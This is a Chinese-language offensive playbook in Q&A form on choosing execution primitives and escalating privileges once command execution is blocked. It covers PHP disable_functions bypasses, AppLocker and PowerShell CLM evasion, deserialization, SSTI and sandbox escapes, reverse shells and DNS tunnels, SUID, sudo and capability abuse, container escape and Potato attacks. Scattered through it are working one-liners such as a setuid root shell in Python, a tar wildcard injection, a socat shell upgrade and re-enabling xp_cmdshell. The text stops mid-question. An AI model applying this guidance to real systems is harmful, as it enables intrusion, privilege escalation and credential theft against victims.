# 提权立足点 · 命令执行受限时执行原语的选择

### 我拿到一个注入点，但还没确定它是不是"命令执行"
**Q1**: 手上有一个可控注入点（SQLi/SSTI/反序列化/表达式），到底能不能拿到命令执行？先怎么判定原语的"能级"？
**A1**: 先给原语分级，别急着上 whoami。从弱到强：文件读 < 文件写 < 受限求值 < 任意代码执行（同进程语言层）< 任意命令执行（能 spawn 子进程）。判据是逐级探测：能读 `/etc/passwd`（读）→ 能落地可控文件（写）→ 能触发带外 DNS/HTTP（求值+网络）→ 能拿 `id` 回显（命令）。别默认最高级，从当前能确证的一级出发规划。
**Q2**: 我确证了"能求值但 spawn 子进程被拦"，说明什么？
**A2**: 卡在语言层到系统层那道墙上——通常是 disable_functions、runtime 沙箱、seccomp 或 spawn 被 hook。正确心态是不追求 `system()`，改用"同进程语言原语"完成后续动作，把"命令执行"这个执念降级成"我到底要达成什么效果"。
**Q3**: 那我要达成的效果具体怎么拆？
**A3**: 拆成三类刚需：读凭据（文件/内存/环境变量）、横向连通（发起出站连接/端口探测）、持久化（落地 webshell/计划任务）。每类都有不依赖 spawn 的语言层实现路径。若今晚只需"读凭据"，spawn 被拦根本不影响。
**Q4**: 如果连"能求值"都没确证，只有一个盲注点？
**A4**: 走带外（OOB）确认：构造让目标发起 DNS/HTTP 请求的 payload，用可控接收端确认求值发生。带外是盲态下最可靠的"原语存在性"证据，比时间盲注稳。
**Q5**: 带外也不通（出站全封）——这条路被墙了往哪转？
**A5**: 转"回内维度"：打不出去就在响应里找信道——时间盲（sleep 差异）、布尔盲（页面差异）、报错回显（结果塞进报错消息）。出站封死不等于原语不存在，它只改变了你观测原语的信道，把"确认执行"从网络信道正交转到时间/内容信道。
**Q6**: 确认原语存在但极弱（只能布尔盲），值不值得继续？
**A6**: 值，但换战术：弱原语适合"精准取值"不适合"交互"。用它逐字节 dump 一个高价值文件（配置/私钥/token），拿凭据后换强通道（SSH/DB 直连/云 API）登场。弱原语的正确用法是"一次性偷钥匙"，不是"当 shell 用"。

### PHP 里 disable_functions 把 system/exec 全禁了
**Q1**: 有 PHP 代码执行，但 disable_functions 禁了一大票命令函数，还剩哪些牌？
**A1**: 先枚举而非猜。用 `get_defined_functions` 对照禁用列表找漏网执行族：`proc_open`/`popen`/`pcntl_exec`/`passthru`/`shell_exec`/`system` 常被漏配一两个。逐个 `function_exists` 探测，任何一个活着直接用。
**Q2**: 命令族真全禁了，还有别的执行维度吗？
**A2**: 转"绕过 spawn"维度：`LD_PRELOAD`+`mail()`/`error_log()` 触发子进程加载恶意 .so；`putenv`+`GCONV_PATH` 走 iconv；FFI（PHP7.4+ 且开启）直接调 libc；`imap_open` 历史注入。这些不在名单里，因为本质不是"命令函数"。
**Q3**: LD_PRELOAD 路子需要什么前提，怎么判可行？
**A3**: 前提三条：能写文件（落 .so）、有一个会 fork 子进程的函数没被禁、`putenv` 未禁。判据：确认能写可执行目录、`function_exists('putenv')` 且找到触发点。缺任一条就换 GCONV_PATH（不依赖 fork，依赖 iconv 触发）。
**Q4**: FFI 不确定开没开，怎么快速判？
**A4**: `class_exists('FFI')` 且 `ini_get('ffi.enable')` 非 disabled。开着就是核弹级——`FFI::cdef` 声明 `system` 再调，绕过所有 PHP 层限制。这是 disable_functions 完全防不住的维度。
**Q5**: 所有 native 绕过都失败（无写权限、FFI 关、putenv 禁）——认输吗？
**A5**: 不认输，正交转"纯 PHP 效果"维度：读文件用 `file_get_contents`/流包装器；连内网用 `fsockopen`/`stream_socket_client` 自写协议；打内网服务用 SSRF 式请求。放弃"拿 shell"，直接用 PHP 当攻击客户端。
**Q6**: 环境是 PHP-FPM，能不能干脆绕过 PHP 层？
**A6**: 可考虑打 FPM 本身：若能触及 9000 端口或 unix socket，用 FastCGI 协议直接投递 `PHP_VALUE` 覆盖 `auto_prepend_file`/关闭 disable_functions。把"应用层受限"正交转到"协议层重配"，绕开当前 worker 的 ini 约束。

### Windows 上 cmd.exe / powershell.exe 被点名限制
**Q1**: 我有能起进程的点，但 cmd.exe 和 powershell.exe 被 AppLocker/软件限制策略挡了。先怎么确认约束边界？
**A1**: 先探测策略类型：跑 cmd 看是"找不到"还是"被策略阻止"（文案不同）。AppLocker 默认放行 `%WINDIR%` 下微软签名二进制，用户可写目录被拦。先确认"哪些路径/哪些签名被允许"，再选原语。
**Q2**: cmd 被拦，还能怎么执行命令逻辑？
**A2**: 转 LOLBins 维度：系统自带、微软签名、通常在白名单里——`mshta`、`regsvr32`、`rundll32`、`wmic`、`msbuild`、`installutil`、`cscript/wscript`。它们能间接执行代码或脚本，绕过对 cmd/powershell 的点名封锁。
**Q3**: PowerShell 二进制被拦，但我还想要 .NET 能力？
**A3**: PowerShell 不等于 powershell.exe。换宿主加载同一个 CLR：`msbuild` 内联任务、`installutil` 卸载钩子、或自写 C# runspace 宿主。语言运行时还在，只是换了个没被点名的入口。
**Q4**: LOLBins 也被脚本规则挡了（连 .hta/.js 都不让跑）——这条被墙往哪转？
**A4**: 正交转"可信目录/DLL 加载"维度：找 AppLocker 白名单目录里的可写子路径（经典是 `Tasks`、部分 `Temp` 例外），或用 DLL 侧加载——把恶意 DLL 放进受信程序的搜索路径，借它加载。执行权从"起进程"正交转到"进程内加载模块"。
**Q5**: 我根本不需要新进程，只想读点东西——有更轻的原语吗？
**A5**: 有。很多场景你要的是文件/注册表/凭据，用当前已在运行且被信任的进程能力（比如通过 WMI 查询、注册表读、SMB 访问 ADMIN$）就够，完全不碰被拦的解释器。先问"我到底要执行还是要数据"，要数据就别硬碰执行策略。

### PowerShell 处于受限语言模式（CLM）
**Q1**: 我进了 PowerShell 但 `$ExecutionContext.SessionState.LanguageMode` 显示 ConstrainedLanguage，很多东西调不了。这限制的是什么？
**A1**: CLM 禁的是 .NET 类型调用、Add-Type、反射等"逃逸到任意代码"的能力，只放行核心 cmdlet。判据：先确认它是 CLM 还是 AppLocker 联动的（CLM 常由 WDAC/AppLocker 触发）。这决定了绕过是"降级语言模式"还是"换宿主"。
**Q2**: 有没有直接把语言模式降回 FullLanguage 的路？
**A2**: 有几条经典思路：若 CLM 由 `__PSLockdownPolicy` 环境变量触发且我能设环境变量并起新 powershell，可绕；或用不受 CLM 约束的宿主（自写 runspace、老版本引擎 v2 若在）。先确认触发源，对症下药。
**Q3**: 环境变量改不动，v2 引擎也没了？
**A3**: 转"cmdlet 拼装"维度：CLM 下核心 cmdlet 仍可用，能用 `Get-Content`/`Set-Content` 读写文件、`Invoke-WebRequest` 出网、`Get-WmiObject` 查询。很多目标（读凭据、下载、内网请求）不需要 .NET 反射，用纯 cmdlet 就能完成。
**Q4**: 我确实需要执行 shellcode 或调 API，纯 cmdlet 不够——这条路被墙往哪转？
**A4**: 正交转"完全离开 PowerShell"维度：既然 PS 被 CLM+策略锁死，换 CLR 宿主（msbuild/installutil）、换脚本引擎（JScript/VBScript 若未锁）、或干脆写编译好的 .NET 可执行落地执行。别在 PS 这一棵树上吊死，执行原语的载体本就该多样。
**Q5**: 换宿主也被 WDAC 全面挡（应用控制很严）？
**A5**: 那说明这是强 WDAC 环境，硬绕成本高。战略转向：不追求本机任意代码，转"用凭据横向"——就地收集凭据/票据，去一台策略更松的机器执行。执行受限时，最优解常常是换一台机器而不是硬啃当前这台的策略。

### 反序列化 gadget 能触发但没有回显
**Q1**: 我确认反序列化点可控且有可用 gadget 链，但打过去页面无变化，不知道成没成。先怎么办？
**A1**: 别急着上 RCE 链，先上"探测链/带外链"确认执行发生。用一个只触发 DNS/HTTP 外连的最小 gadget（或让它 sleep）确认链真的跑了。判据是带外收到请求或响应变慢——先证明"链通"，再谈"拿结果"。
**Q2**: 带外确认链通了，但我要命令结果，怎么把无回显变有回显？
**A2**: 三条路：带外外传（把命令输出塞进 DNS 子域/HTTP 参数发出来）、写文件到 web 可访问路径再去读、或用能返回值的 gadget 变体把结果回填到响应。选哪条取决于目标能不能出网、有没有 web 可读目录。
**Q3**: 目标不出网，也没有明显的 web 可读写目录？
**A3**: 转"就地落 webshell/内存马"维度：反序列化很多语言可以直接注入一个内存马（不落文件），后续通过特定 header/参数触发并回显。把"一次性无回显 RCE"升级成"有回显的常驻通道"，问题就从取结果变成了正常交互。
**Q4**: gadget 链在这个版本/依赖下打不通（ClassNotFound 之类）——被墙往哪转？
**A4**: 正交转"换 gadget 来源"维度：链依赖目标 classpath 里有什么。先枚举依赖（报错信息、jar 指纹、版本探测），换一条匹配现有依赖的链；或不追求 RCE，用只需 JDK 原生类的链做 JNDI/文件读/SSRF 等较弱但更普适的效果。链的选择本质是"匹配目标依赖清单"。
**Q5**: 连能用的链都找不到（依赖太干净）？
**A5**: 降级目标：反序列化即使不能 RCE，往往还能做 DoS、SSRF、文件读写探测、或触发 JNDI 注入打二次利用。把"这个点必须 RCE"的预期放下，让它作为"内网探测/二次注入"的跳板，价值仍在。

### SSTI 落在受限沙箱模板引擎里
**Q1**: 我确认是 SSTI（比如 Jinja2/Freemarker 类），但引擎开了沙箱，常规 payload 报 SecurityError。先判什么？
**A1**: 先判"沙箱拦的是什么层"：是拦属性访问（`__class__`/`__globals__`）、拦特定内建、还是拦调用本身。判据是逐个探测哪一步报错——能不能访问对象、能不能取属性、能不能调用。定位那道具体的墙，绕过才有方向。
**Q2**: 属性遍历（爬 MRO 找可利用类）这条经典路被沙箱盯死了？
**A2**: 转"绕过属性过滤"维度：用 attr 过滤器/getattr 等价物、用 `|attr('__cl'+'ass__')` 拼接绕关键字黑名单、用请求上下文里已暴露的对象（config、request、self）作为跳板。沙箱常只黑名单少数字符串，字符串层混淆常能过。
**Q3**: 沙箱升级了，连拼接和过滤器都堵——被墙往哪转？
**A3**: 正交转"不追求 RCE，只要信息"维度：SSTI 即便沙箱化，通常仍能读到模板上下文里的敏感对象（配置、密钥、session 密钥、DB 连接串）。拿到 secret key 可能就能伪造签名/session，效果不亚于 RCE。把目标从"执行命令"转到"泄露上下文机密"。
**Q4**: 上下文里也没有值钱对象？
**A4**: 转"引擎特性"维度：不同引擎有各自的逃逸面（Freemarker 的 `new`/`Execute`、Velocity 的类加载、Twig 的 filter 注册）。先精确指纹到引擎和版本，按该引擎已知的沙箱逃逸面打，而不是套用通用 payload。指纹错了，所有 payload 都白费。
**Q5**: 引擎沙箱确实无已知逃逸（补丁很新）？
**A5**: 降级为"表达式层杠杆"：能算数、能拼字符串、能触发引擎去请求外部资源，往往就够做 SSRF、盲注放大、或读取渲染其他敏感模板。承认这个点拿不到 RCE，把它当作一个"受限但可用的求值原语"纳入整体链条，而不是死磕逃逸。

### Java 应用装了 SecurityManager 或类加载限制
**Q1**: 我确认 Java 代码执行，但一调 `Runtime.exec` 就抛 AccessControlException，说明 SecurityManager 在盯着。先怎么定位？
**A1**: 先读它的 policy 边界：哪些 permission 被授予、哪些被拒。判据是逐个操作试探——`System.getProperty`/`FilePermission` 读探测目录、`SocketPermission` 试探连通性。一张 permission 表能告诉我哪些原语还活着，别猜。
**Q2**: exec 被禁但反射能用，能绕吗？
**A2**: 经典思路是反射禁用 SM：`System.setSecurityManager(null)` 若 `setSecurityManager` 权限没被拒，直接摘掉。或反射改 `Policy` 单例。判据是这两个动作抛不抛异常，只要活一条就一步到位。
**Q3**: 反射也被 policy 挡死？
**A3**: 转"绕开 JVM 层"维度：JNI/自定义 ClassLoader 加载受信 jar、通过 `ProcessBuilder` 反射变体、或找业务代码里已被授权的 privileged 块作为跳板（`AccessController.doPrivileged` 块内代码不受调用者权限约束）。找 privileged 洞比正面攻 policy 便宜。
**Q4**: 一条 privileged 缝隙都没找到——被墙往哪转？
**A4**: 正交转"不 exec 也能达成"维度：Java 里读文件、连内网、跑 SQL、发 HTTP 都不需要 exec。若目的是横向或读凭据，直接用 JDBC/HttpClient/NIO 完成。SM 主要拦命令执行和敏感 IO，业务层网络通常是开的。
**Q5**: 我确实需要在本机跑二进制（比如 mimikatz 类）？
**A5**: 换战场：本机跑二进制这个执念常常是错的。把凭据类需求转成"用 Java 内 API 抓"——JDBC 连接串里明文密码、session 缓存、Spring 环境变量。真需要跑本机工具就不该在受 SM 约束的进程里做，转投横向到一台松的机器。

### Node.js 拿到 eval 但被 vm 沙箱或 permission model 关住
**Q1**: 我在 Node 应用里拿到 `eval`/`Function` 求值，但代码跑在 `vm.runInContext` 里，`process`/`require` 拿不到。先判什么？
**A1**: 判"沙箱模型"：vm 模块的沙箱不隔离原型链，经典逃逸是通过 `this.constructor.constructor('return process')()` 爬回主上下文。先探测 `this` 是什么、构造器链能不能走通。判据是能不能拿到 `process`。
**Q2**: 拿到 `process` 就等于 RCE 吗？
**A2**: 基本是——`process.mainModule.require('child_process').exec` 一步 spawn。但注意 Node 20+ 的 `--experimental-permission`：即使拿到 process，spawn/fs 也可能被 permission model 拦。判据是先跑个无害 `child_process.exec('id')` 看抛不抛 ERR_ACCESS_DENIED。
**Q3**: permission model 拦了 child_process 和 fs——这条被墙往哪转？
**A3**: 正交转"纯 JS 效果"维度：Node 内置 http/https/net/dns 通常仍开着，能自写协议连内网、发请求、DNS 外传。求值原语还在，只是 spawn 和 fs 被砍了；用 Node 当攻击客户端而不是 shell 宿主。
**Q4**: 我需要落 webshell 持久化，但 fs 被限？
**A4**: 转 process.env 和内存维度：把 payload 挂进已加载模块的导出对象（monkey-patch 一个中间件），触发路径改由请求参数控制。等价于内存马——不写盘就绕过 fs 权限。前提是能爬到 require cache。
**Q5**: 连 `this.constructor.constructor` 都拿不到（vm2/isolated-vm 之类）？
**A5**: 降级预期：isolated-vm 是真隔离，别硬碰。把求值点当"信息抽取器"用——它能算、能拼、能返回结果，就够 dump 沙箱注入的上下文对象（业务传进来的 user、config、db handle）。从"逃逸沙箱"正交转到"洗劫沙箱内暴露对象"。

### Python eval 但 builtins 被清空
**Q1**: Python 里能塞表达式，但 `__builtins__` 被替换成空 dict，`open`/`exec`/`__import__` 全没了。先怎么办？
**A1**: 先确认真的空了还是仅隐藏。Python 里 builtins 常能通过对象爬回：任意对象 `.__class__.__mro__[-1].__subclasses__()` 遍历到 `warnings.catch_warnings` 之类，从其 `__globals__` 拿回 builtins。判据是能不能拿到一个非 None 对象。
**Q2**: 表达式模式不能用语句，怎么办？
**A2**: eval 只吃表达式，不吃 `import`/`for`。但 list comprehension、生成器、赋值表达式（walrus）都是表达式；调用形式的 `__import__` 从爬回的 builtins 里取。逻辑上表达式和语句等价，只是语法收紧。
**Q3**: 对象爬取路径被 AST 检查器（黑名单 `__` 关键字）拦了？
**A3**: 转"字符串构造"维度：`__class__` 可以由 `"_"*2+"class"+"_"*2` 拼出，`getattr` 用 hex/oct 表达式绕，或者用 `vars()`/`globals()`（若未禁）直接跳过 dunder。AST 层过滤字符串常量很难做，一般是 token 层黑名单，字符串拼接绕。
**Q4**: AST 白名单模式（只放行算术），什么都拼不出——这条被墙往哪转？
**A4**: 正交转"读取上下文变量"维度：AST 白名单常允许标识符引用。业务传进来的变量（request、user、db）本身就是完整对象，直接引用它们不需要 dunder。把"逃 sandbox"转成"利用 sandbox 里已注入的对象"。
**Q5**: 上下文也很干净？
**A5**: 承认这是极受限求值原语，用它做"计算杠杆"：辅助盲注定位、放大字符串搜索、算加密偏移。别期望每个 eval 都能 RCE，弱原语常在链条中间作为一个环节存在，不是终点。

### 反弹 shell 死活弹不出来
**Q1**: 我有可靠 RCE，但 bash/nc/curl 反连全部超时，说明什么？
**A1**: 出网被限（防火墙出站策略）或域名/协议被审查。先分层探因：ICMP 通不通？TCP 常用端口（80/443/53）通不通？UDP 53 通不通？这决定了走哪种通道。
**Q2**: TCP 80/443 通但 nc 反弹还是失败？
**A2**: 可能是有 HTTP 强制代理/深度包检测。改用"看起来像 HTTP"的通道：反连 payload 用 curl 长轮询自制、或走 websocket。协议伪装能过大部分 L7 出站检测。
**Q3**: 只有 DNS 出站？
**A3**: 转 DNS 通道：用 iodine/dnscat2 类思路建 DNS 隧道。缺点是慢，但用于交互 shell 足够。前提是能控一个域名的权威 NS。DNS 是审查最松的通道之一。
**Q4**: 反向连接完全不通，只有出网的 pull 型（能主动请求）——被墙往哪转？
**A4**: 正交转"webshell/正向轮询"维度：不弹了，改让目标机跑一个"轮询取指令"的最小客户端，每隔 N 秒去 pull 我方 HTTP。或者干脆停留在 webshell 交互模式，别追求交互式 shell。反弹只是形式，指令下发才是目的。
**Q5**: 连出站 pull 都被拦（完全孤岛）？
**A5**: 转"入向通道"维度：如果目标有对外服务（被我从外面访问进来的那个），就用它做 C2——webshell 藏在业务接口里，指令通过 HTTP 请求参数下发。孤岛机器的正确 C2 是"通过它对外暴露的服务"而不是它主动出去。

### 拿到 shell 但不是交互式 tty
**Q1**: 反弹回来一个 dumb shell，能敲命令但没历史、没 tab、`sudo`/`ssh`/`vi` 全炸。要不要升 tty？
**A1**: 判断是否必须升。只做一次性取文件/加计划任务不需要 tty，硬升反而暴露。要交互 sudo 提权、跑 tmux、编辑配置才升。判据是"下一步动作是否依赖终端语义"。
**Q2**: 决定升，Linux 上标准三板斧是什么？
**A2**: `python -c 'import pty; pty.spawn("/bin/bash")'`、`script -qc /bin/bash /dev/null`、或 `stty raw -echo; fg`（本地 nc 端）配合。三选一按目标可用性走，脚本语言存在的机器优选 pty 法。
**Q3**: 目标没 python 也没 script，怎么办？
**A3**: 转 socat：`socat file:$(tty),raw,echo=0 tcp-listen:...` + 目标端 `socat exec:'bash -li',pty,stderr...`。socat 二进制在很多镜像里都有，实在没就先 wget/curl 拉一个静态编译版本上去（若能写文件）。
**Q4**: 升了 tty 但 `stty` 尺寸乱、Ctrl-C 会掉线——被墙往哪转？
**A4**: 正交转"不追求本地 tty"维度：起个 SSH。用当前 shell 生成密钥、追加到目标 `authorized_keys`（若能写），从我方 SSH 反连回来的通道就是原生 tty。以后交互都走 SSH，把反弹 shell 只当"引导跳板"。
**Q5**: SSH 端口不开也没法开？
**A5**: 转 tmux/screen 落地：起一个后台 tmux 会话，反弹 shell 通过 `tmux attach` 进入，天然有完整终端语义。或用 web 端 shell（wetty/gotty）在目标本地起个 HTTP 终端，通过隧道访问。

### Linux 上枚举完 SUID 二进制，怎么挑
**Q1**: 跑 `find / -perm -4000` 列出一堆 SUID 二进制，从哪个开始看？
**A1**: 分三层排：一是 GTFOBins 覆盖的经典（`find`/`vim`/`less`/`python`/`nmap` 老版），直接查表照套；二是非标准/自研 SUID（业务厂商私货），逆向或字符串搜命令拼接；三是版本老的系统组件（`pkexec`/`sudo`/`chfn` 等 CVE 常客），查 CVE 表。
**Q2**: GTFOBins 里都没匹配，是自研 SUID —— 怎么下手？
**A2**: 先 strings + ltrace 看它调不调外部命令。若拼字符串跑 `system("cp ...")`，PATH 劫持或参数注入就成；若用绝对路径调，看能不能通过环境变量（`LD_PRELOAD` 若未清、`IFS` 分隔）或参数解析漏洞影响。
**Q3**: 二进制清了 PATH 和环境，也用绝对路径？
**A3**: 转"读文件/写文件的 SUID"维度：不是所有 SUID 都要拿 shell。能以 root 读任意文件的 SUID（自定义日志读取器之类）就足以 dump `/etc/shadow`/私钥；能写任意文件的 SUID 就能改 `/etc/passwd`/写 sudoers。降级目标，从"提权"到"取值"。
**Q4**: 都试完没突破——被墙往哪转？
**A4**: 正交转"非 SUID 提权面"维度：capability（`getcap -r /`）、sudo -l、cron 可写脚本、写入 PATH 的 root 服务、内核 exp、组权限（docker/lxd/disk 组直通 root）。SUID 只是提权面的一小片，卡住时应完整枚举整个矩阵。
**Q5**: 完整矩阵跑完还是无解？
**A5**: 承认本机提权路径不明显，转横向：抓当前用户能触及的凭据（`.bash_history`、私钥、config 里的密码、浏览器存储），去另一台机器试；或者停留在低权也可以完成任务（读业务数据、当跳板），别把"必须 root"当刚需。

### sudo -l 有条目但 NOPASSWD 限得死
**Q1**: `sudo -l` 显示我能以 root 跑几个特定命令，但参数被限制。先看什么？
**A1**: 看两点：命令是否在 GTFOBins 有 sudo 逃逸条目（`awk`/`less`/`man`/`vi` 直接内嵌 shell）；参数是否有通配符（`sudo /path/prog *` 类，能拼参数）。前者一步搞定，后者是最经典的错配。
**Q2**: 是通配符错配（比如 `sudo tar *`）——怎么利用？
**A2**: 用 tar 的 `--checkpoint-action=exec=` 类特性，或 rsync 的 `-e`，或 find 的 `-exec`。原理是让程序把某个参数解释为"执行动作"。造一个命名成参数的文件（`--checkpoint-action=...`）放当前目录，通配符展开时就注入了。
**Q3**: 参数完全固定，只能跑一个特定命令+特定参数？
**A3**: 转"命令本身副作用"维度：即使参数固定，若命令是编辑器/查看器/压缩工具，它们内部常有 shell 逃逸。或若命令是自研脚本，去读脚本内容找二次注入点（它调了什么、参数怎么传）。
**Q4**: 命令是 root 权限跑的自定义脚本，脚本读一个我不可控的配置——被墙往哪转？
**A4**: 正交转"文件时序"维度：看脚本读的配置/日志/临时文件是不是我可写的、或读之前有没有短窗口。TOCTOU、符号链接替换、race condition 是这类场景的经典突破口。sudo 命令固化时，攻击面转到它依赖的文件系统状态。
**Q5**: 依赖文件也全是 root 拥有，无 race？
**A5**: 降级用法：即使不能提权，NOPASSWD 命令本身也是一个信息原语——若能以 root 读某个文件（比如 `sudo cat /var/log/xxx`），拿到日志里的凭据就够横向。把 sudo 条目当"root 视角的信息读取器"而非提权跳板。

### Linux capability 授权枚举后怎么用
**Q1**: `getcap -r /` 找到几个非标 SUID 但带 capability 的二进制。先看什么？
**A1**: 按能力分类：`cap_setuid` 允许设置 uid（近乎等价 SUID）；`cap_dac_read_search`/`cap_dac_override` 直接读任意/写任意文件；`cap_sys_admin` 万能；`cap_net_raw` 可 sniff/spoof；`cap_sys_ptrace` 可 attach 任意进程。每种利用路径不同。
**Q2**: 是 `cap_setuid+ep` 挂在 python/perl/ruby 上？
**A2**: 直接一步 root：`python -c 'import os;os.setuid(0);os.system("/bin/bash")'`。能力挂在解释器上等同于把解释器变成 SUID，比经典 SUID 还灵活。
**Q3**: 是 `cap_dac_read_search` 挂在 `tar`/`cp` 上，只能读？
**A3**: 用它 dump `/etc/shadow`、其他用户私钥、`/root/.ssh/*`。拿到 hash 或密钥再走另一条路（离线爆破/SSH）。读原语不能直接提权，但能变现成"另一个身份的凭据"，等价效果。
**Q4**: 是 `cap_sys_ptrace`——这个怎么用？
**A4**: attach 到 root 进程注入代码。找一个长期运行的 root 进程（如 systemd 服务），用 gdb/自写 ptrace 客户端调用 `execve`，或注入 shellcode。判据是能不能 attach（PTRACE_ATTACH 返回值）。
**Q5**: 全都是弱能力（`cap_net_bind_service` 之类），提不了权——被墙往哪转？
**A5**: 正交转"能力可辅助横向/持久化"维度：`cap_net_raw` 可以 sniff 内网明文流量抓凭据；`cap_net_bind_service` 可绑低端口起假服务钓凭据。弱能力当作侦察/钓鱼原语用，不硬求提权。

### 什么时候敢上内核 exp
**Q1**: 用户态提权路径全试完没突破，看到内核版本疑似有已知 exp。要不要打？
**A1**: 三个门槛：一是环境是否可承受崩溃（生产/共享/HIDS 严格禁打）；二是 exp 是否针对该发行版编译过的确切版本（内核 exp 版本敏感）；三是有无回退计划（打崩了怎么办）。三点全满足才动，否则先攒别的路。
**Q2**: 环境允许打，怎么选 exp？
**A2**: 优选"数据结构类"和"逻辑漏洞类"（Dirty Pipe、Dirty Cow、OverlayFS 提权、nf_tables 类），成功率高、影响面窄；避 SLUB/UAF 类通杀 exp（易崩、需要精确 offset）。判据是 exp README 里的稳定性描述和支持内核版本。
**Q3**: 编译环境不匹配（目标无 gcc），怎么办？
**A3**: 在攻击机用 musl-cross/静态编译对应架构版本，落地跑。或找已编译好的 blob（版本对得上再用）。切忌在目标机装 gcc——太吵。
**Q4**: 打了一次没提权成功也没崩，怎么判断状态？
**A4**: 别重复打。检查 dmesg/syslog 有没有留痕（EDR/审计常盯内核报错）、看 exp 是否有"利用一次后目标状态改变"的副作用（比如某文件被创建/某进程注入）。判断是"没触发"还是"触发但未成"，两者应对不同。
**Q5**: exp 打了目标机 kernel panic——被墙往哪转？
**A5**: 正交转"这条路不能再走"，且要立即评估是否已暴露。重启后被察觉概率高，转向"利用当前已获得凭据快速横向"，别在同一台上再试。内核 exp 是"要么成要么烧线索"的动作，失败即代价。

### 容器里想逃逸到宿主
**Q1**: 我在容器/Docker 内拿到 root，想跳到宿主。先判什么？
**A1**: 三个信号快速判：`/.dockerenv`/`/run/.containerenv` 存在？`/proc/1/cgroup` 有 docker/kubepods 字样？`ls /` 结构像不像最小镜像？确认是容器后再问"是特权容器吗"（`capsh --print` 看 caps 是否包含 sys_admin/sys_module）。
**Q2**: 是特权容器（--privileged 或大量 caps）？
**A2**: 直接一步逃：`mount` 宿主根目录（`/dev/sda1` 类）到容器内、或用 `cgroup release_agent` 触发宿主执行、或加载内核模块。特权容器的逃逸原语一大堆，任选。
**Q3**: 非特权，但看到 docker.sock 挂载进来？
**A3**: 一步等价 root：用 docker 客户端连 sock 起一个 `--privileged -v /:/host` 的新容器。docker.sock 挂进容器本质就是把宿主 root 授权给了容器内。
**Q4**: 非特权、无 sock，是普通容器——被墙往哪转？
**A4**: 正交转"内核 CVE + 挂载检查"维度：runc/containerd 历史逃逸 CVE、写 `/proc/self/mem`、cgroup v1 release_agent 若未 remount。同时检查挂载点，很多环境把宿主目录（比如日志/配置）挂进来，写关键文件（cron/authorized_keys）也能跳。
**Q5**: 内核也补好、无异常挂载——认了？
**A5**: 降级战术：不逃也能有价值。容器内往往能通过内网服务链接到其他容器/宿主服务（K8s API、metadata service、内网 DB）。把当前 pod 当跳板做横向，比死磕逃逸性价比高。

### Windows 有 SeImpersonate/SeAssignPrimaryToken 特权
**Q1**: `whoami /priv` 显示我有 SeImpersonatePrivilege（IIS/MSSQL/Exchange 类服务账号常有）。这意味着什么？
**A1**: 意味着能用"Potato 家族"提权：只要能诱使一个 SYSTEM 进程给我一个可模拟的 token，我就能变 SYSTEM。原理是 RPC/COM 认证时的 impersonation 语义。判据是本机是否有可触发的 RPC/COM 面（有 SeImpersonate 的账号几乎都在服务上下文，通常都有）。
**Q2**: 选哪个 Potato 变种？
**A2**: 按 OS 版本挑：老系统 RottenPotato/JuicyPotato；较新系统封了 COM 端口就用 PrintSpoofer（打 Spooler RPC）或 RoguePotato；新到连这些都封的用 GodPotato（走 RPC）/DCOM 变体。判据是先 `sc query spooler` 看 Spooler 状态、看能不能起 COM 服务器。
**Q3**: 有 SeImpersonate 但 Potato 都失败（Spooler 关、COM 端口封）？
**A3**: 转 SeAssignPrimaryToken 直用：若还有这个权限，可以直接 CreateProcessAsUser 用别人 token 起进程，前提是能拿到 token（枚举现有进程 OpenProcessToken）。少一步"骗 SYSTEM 给 token"，直接用别的用户已有的 token。
**Q4**: token 也拿不到（不能 OpenProcess 到高权进程）——被墙往哪转？
**A4**: 正交转"该服务账号的横向价值"维度：SeImpersonate 常挂在 IIS/MSSQL 类服务号上，这些账号在域内可能是机器账号，机器账号能读 LDAP、可能触及 ADCS 模板、可能挂在数据库里。不提权也能横向做很多事。
**Q5**: 本机就是想拿 SYSTEM 做某件事？
**A5**: 降级方案：很多"SYSTEM 才能做"的事其实用当前服务账号+服务上下文能做（读 SAM 需要 SYSTEM 但读 lsass 服务账号+SeDebug 就够；改注册表某些 key 服务账号有权）。先精确定位"到底哪一步需要 SYSTEM"，可能根本不需要提权。

### 只有文件写，没有直接执行
**Q1**: 我确认能任意写文件，但没有 RCE 原语，怎么把写变成执行？
**A1**: 按"目标进程会主动读什么"分类：Web 服务下写 webshell（路径需可访问）、写.htaccess/nginx 配置（若能触发 reload）、写 SSH `authorized_keys`（若目标跑 sshd）、写 crontab/systemd unit（若有权且目录被扫）、写 `.bashrc`/`.profile`（等下次登录）、写解释器 pyc/`__pycache__`（若比源新则加载）。选取决于能写哪些路径。
**Q2**: 我能写但不知道 web 根在哪？
**A2**: 走"读写探测"：先写一个可识别标记文件到几个常见路径（webroot 候选 `/var/www/html`/`/usr/share/nginx/html`/自定义），从 web 端逐个访问看哪个能回显。或用文件读原语先读 nginx/apache 配置定位 root。
**Q3**: web 根不可写，SSH 家目录也隔离——被墙往哪转？
**A3**: 正交转"写触发执行"维度：找一个 root 或服务定期读的位置。常见如 `/etc/cron.d/`（若可写）、`/etc/logrotate.d/`（logrotate 有 postrotate 脚本）、`/etc/update-motd.d/`（下次 SSH 登录时 root 跑）、systemd 的 `/etc/systemd/system/`。把执行时机让给系统进程。
**Q4**: 全部系统目录只读，只能写用户空间？
**A4**: 转"钓当前用户"维度：改用户家目录的 `.bashrc`/`.zshrc`/`git hooks`/`.vimrc`——等用户下次操作时执行。若目标是运维会用的账号，这条路很稳，代价只是等。
**Q5**: 目标用户永远不再登录（服务账号无 shell）？
**A5**: 承认写不出直接执行，把写用作"补充凭据"：写一个恶意 SSL 证书骗 MITM、写 hosts 挟持解析、写公钥到某处等未来某天连上。写原语的价值不一定即时兑现，可以埋伏。

### SQLi 拿到但没有 xp_cmdshell / UDF / into outfile
**Q1**: 我确认 SQL 注入且是高权账号，但常见提权路径（MSSQL `xp_cmdshell`、MySQL UDF、`SELECT INTO OUTFILE`、PostgreSQL `COPY PROGRAM`）全失败。先怎么判？
**A1**: 分层判失败原因：是被禁（配置关闭）？是无权限（DBA 也不能开）？还是 secure-file-priv 类沙箱路径限制？不同原因对应不同绕路。判据在报错信息里，别只看"失败"，看具体错误码。
**Q2**: MSSQL `xp_cmdshell` 被禁但我是 sysadmin？
**A2**: 若能 `sp_configure` 就开回来（`sp_configure 'xp_cmdshell', 1; RECONFIGURE`）。若 `sp_configure` 也被限，转 CLR 集成（`sp_add_assembly` 加载恶意 .NET 程序集）、或 OLE Automation（`sp_OACreate`）。MSSQL 里执行原语不止 xp_cmdshell 一个。
**Q3**: MySQL UDF 加载不了（`secure_file_priv` 非空）？
